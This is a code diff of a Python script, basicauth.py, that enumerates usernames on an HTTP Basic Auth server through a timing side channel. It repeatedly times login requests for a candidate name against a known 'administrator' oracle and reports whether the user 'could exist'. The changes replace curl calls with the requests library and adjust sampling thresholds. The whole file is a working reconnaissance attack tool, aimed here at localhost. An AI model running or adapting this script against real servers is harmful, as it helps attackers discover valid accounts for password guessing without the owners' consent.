@@ -6,10 +6,10 @@
 # Aggregate response time as the baseline.  We create an example administrator
 # user for the purposes of this test.
 
-# The script takes a single input ala: './basicauth.py username'
-
+# The script currently takes a single input ala: './basicauth.py username'
 import sys
 import timeit
+
 class bcolors:
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
@@ -20,26 +20,23 @@ class bcolors:
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
 
+target="localhost"
 username=sys.argv[1]
+oracle="administrator"
+password="testa"
 
-execme="""from subprocess import call
-import os
-FNULL = open(os.devnull, 'w')
-call(["curl", "http://""" + username +""":obvious@localhost"],stdout=FNULL,stderr=FNULL)"""
+execme="""import requests
+url = 'http://"""+target+"""'
+r = requests.get(url, auth=('""" + username+"""','"""+ password+"""'))
+"""
 
-execmenext="""from subprocess import call
-import os
-FNULL = open(os.devnull, 'w')
-call(["curl", "http://administrator:aaa@localhost"],stdout=FNULL,stderr=FNULL)"""
+execmenext="""import requests
+url = 'http://"""+target+"""'
+r = requests.get(url, auth=('""" + oracle +"""','"""+ password+"""'))
+"""
 
 
-avggarb=0
-avgreal=0
-i=0
-totreal=0
-totgarb=0
-exitweight=0
-flag=""
+avggarb=avgreal=i=totreal=totgarb=exitweight=0
 while True:
 	i+=1
 	garbageuser=timeit.timeit(execme,number=1)
@@ -50,18 +47,15 @@ while True:
 		avgreal=realuser+avgreal/2
 		totreal+=realuser
 	else:
-		
-		avgreal=realuser
-		avggarb=garbageuser
-		totreal=avgreal
-		totgarb=avggarb
-	if( i % 450 == 0):
-		# the constant std deviation 0.0145 is based on observation of my environment YMMV.
-		if(abs((totreal/totgarb)-1) > 0.0145):
-#			flag=bcolors.FAIL
+		totreal=avgreal=realuser
+		totgarb=avggarb=garbageuser
+	if( i % 900 == 0):
+		if(abs((totreal/totgarb)-1) > 0.059):
+			flag=bcolors.FAIL
 			print username +" : doesn't exist"
 		else:
-#			flag=bcolors.OKGREEN
+			flag=bcolors.OKGREEN
+			exitweight+=1
 			print username +" : could exist"
-		print flag + "RU/GU AVG:" + str(avgreal)+"/"+str(avggarb) +" TRE/TGB:"+str(totreal)+"/"+str(totgarb)+","+str(abs((totreal/totgarb)-1 ))
+		print flag + "RU/GU AVG:" + str(avgreal)+"/"+str(avggarb) + "["+str(exitweight) +"/"+str(i/500)+"]"+"TRE/TGB:"+str(totreal)+"/"+str(totgarb)+","+str(abs((totreal/totgarb)-1 ))+bcolors.ENDC
 		exit(0)
